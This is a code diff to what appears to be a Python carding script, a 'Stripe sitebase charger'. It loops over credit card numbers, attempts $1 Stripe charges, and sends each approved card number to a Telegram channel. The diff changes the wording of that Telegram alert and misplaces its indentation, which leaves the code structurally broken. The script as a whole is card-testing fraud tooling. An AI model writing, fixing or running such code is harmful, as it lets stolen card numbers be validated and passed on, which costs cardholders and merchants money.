@@ -221,17 +221,18 @@ for cc in credit_cards:
                 rprint(Panel(Text(f"{cc.strip()} - Your card was declined.", style="red"), title="Declined"))
             elif 'customer_id' in response_text and 'subscription_id' in response_text:
                 rprint(Panel(Text(f"{cc.strip()} - Approved, charged successfully.", style="green"), title="Approved"))
-                message = f"""
-✧ STRIPE 𝚂𝙸𝚃𝙴𝙱𝙰𝚂𝙴 𝙲𝙷𝙰𝚁𝙶𝙴𝚁✧
-⚝──⭒──⭒──⭒──⭒──⭒──⭒──⭒──⭒⚝
-*[✦]𝗖𝗮𝗿𝗱 -»* `{cc.strip()}`
-*[✦]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -»* 𝗦𝗧𝗥𝗜𝗣𝗘 1$
-*[✦]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -»* _CVV CHARGED!_ ✅
-*[✦]𝗦𝗧𝗔𝗧𝗨𝗦 -»* Approved, charged successfully.
-*[✦]𝗖𝗨𝗦𝗧𝗢𝗠𝗘𝗥 𝗜𝗗 -»* {customer_id}
-*[✦]𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗜𝗗 -»* {subscription_id}
+                # Modified message
+message = f"""
+**
+┏━━━━━━━⍟
+┃#CHARGE 1$ ✅
+┗━━━━━━━━━━━⊛
+⊙ CARD:- `{cc.strip()}`
+⊙ RESPONSE:- CVV CHARGE ✅
+⊙ MSG:- PAYMENT SUCCESSFUL ✅
+**
 """
-                send_telegram_message(message)
+send_telegram_message(message)
             else:
                 rprint(Panel(Text(f"{cc.strip()} - {response_text}", style="yellow"), title="Response"))
 
